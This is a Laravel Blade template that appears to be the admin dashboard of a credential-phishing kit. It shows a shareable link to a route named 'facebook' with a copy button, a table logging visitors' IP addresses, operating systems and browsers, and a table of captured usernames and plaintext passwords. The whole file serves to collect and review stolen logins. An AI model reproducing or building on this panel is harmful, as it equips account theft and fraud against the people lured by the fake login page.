@extends('layouts.app')

@section('content')
<section class="content-header">
    <div class="container-fluid">
        <div class="row mb-2">
            <div class="col-sm-6">
            <h1>DataTables</h1>
            </div>
            <div class="col-sm-6">
            <ol class="breadcrumb float-sm-right">
                <li class="breadcrumb-item"><a href="#">Home</a></li>
                <li class="breadcrumb-item active">DataTables</li>
            </ol>
            </div>
        </div>
    </div><!-- /.container-fluid -->
</section>

<section class="content">
    <div class="container-fluid">
        <div class="row">
            <div class="col-6">
                <div class="card">
                    <div class="card-header">
                    <h3 class="card-title">Shared Url</h3>
                    </div>
                    <!-- /.card-header -->
                    <div class="card-body">
                        <a href="{{ route('facebook') }}" id="foo" target="_blank" rel="noopener noreferrer">{{ route('facebook') }}</a>
                        <button class="btn" data-clipboard-target="#foo">
                            <i class="fas fa-clipboard-list"></i>
                        </button>

                    </div>
                    <!-- /.card-body -->
                </div>
                <!-- /.card -->

            
            <!-- /.card -->
            </div>
            <!-- /.col -->
            <div class="col-6">
                <div class="card">
                    <div class="card-header">
                        <h3 class="card-title">custom url</h3>
                    </div>
                    <!-- /.card-header -->
                    <div class="card-body">
                        
                    </div>
                    <!-- /.card-body -->
                </div>
                <!-- /.card -->

            
            <!-- /.card -->
            </div>
            <!-- /.col -->
        </div>
        <!-- /.row -->
    </div>
    <!-- /.container-fluid -->
</section>


<section class="content">
    <div class="container-fluid">
        <div class="row">
            <div class="col-7">
                <div class="card">
                    <div class="card-header">
                    <h3 class="card-title">List of Users</h3>
                    </div>
                    <!-- /.card-header -->
                    <div class="card-body">
                        <table id="example" class="table table-striped" style="width:100%">
                            <thead>
                                <tr>
                                    <th>Ip Address</th>
                                    <th>Type Ip</th>
                                    <th>Operative System</th>
                                    <th>User Agent</th>
                                    <th>Browser</th>
                                    <th>Date</th>
                                </tr>
                            </thead>
                            <tbody>
                                @foreach ($data as $dat)
                                <tr>
                                    <td>{{ $dat->ip }}</td>
                                    <td>{{ $dat->type }}</td>
                                    <td>{{ $dat->os }}</td>
                                    <td>{{ $dat->useragent }}</td>
                                    <td>{{ $dat->browser }}</td>
                                    <td>{{ $dat->created_at }}</td>
                                </tr>
                                @endforeach
                            </tbody>
                            <tfoot>
                                <tr>
                                    <th>Ip Address</th>
                                    <th>Type Ip</th>
                                    <th>Operative System</th>
                                    <th>User Agent</th>
                                    <th>Browser</th>
                                    <th>Date</th>
                                </tr>
                            </tfoot>
                        </table>
                    </div>
                    <!-- /.card-body -->
                </div>
                <!-- /.card -->

            
            <!-- /.card -->
            </div>
            <!-- /.col -->

            <div class="col-5">
                <div class="card">
                    <div class="card-header">
                    <h3 class="card-title">List of Users</h3>
                    </div>
                    <!-- /.card-header -->
                    <div class="card-body">
                        <table id="example" class="table table-striped" style="width:100%">
                            <thead>
                                <tr>
                                    <th>Ip Address</th>
                                    <th>Username</th>
                                    <th>Password</th>
                                    <th>Date</th>
                                </tr>
                            </thead>
                            <tbody>
                                @foreach ($credentials as $cred)
                                <tr>
                                    <td>{{ $cred->ip }}</td>
                                    <td>{{ $cred->username }}</td>
                                    <td>{{ $cred->password }}</td>
                                    <td>{{ $cred->created_at }}</td>
                                </tr>
                                @endforeach
                            </tbody>
                            <tfoot>
                                <tr>
                                    <th>Ip Address</th>
                                    <th>Username</th>
                                    <th>Password</th>
                                    <th>Date</th>
                                </tr>
                            </tfoot>
                        </table>
                    </div>
                    <!-- /.card-body -->
                </div>
                <!-- /.card -->

            
            <!-- /.card -->
            </div>
        </div>
        <!-- /.row -->
    </div>
    <!-- /.container-fluid -->
</section>
@endsection

{{-- Add common CSS customizations --}}

@push('css')
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.3.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.datatables.net/2.1.8/css/dataTables.bootstrap5.css">

@endpush

@push('js')   

    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.datatables.net/2.1.8/js/dataTables.js"></script>
    <script src="https://cdn.datatables.net/2.1.8/js/dataTables.bootstrap5.js"></script>

    <script>
        new DataTable('#example', {
            order: [[0, 'desc']]
        });
    </script>


    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script>

    <script>
        new ClipboardJS('.btn'); 
    </script>
@endpush

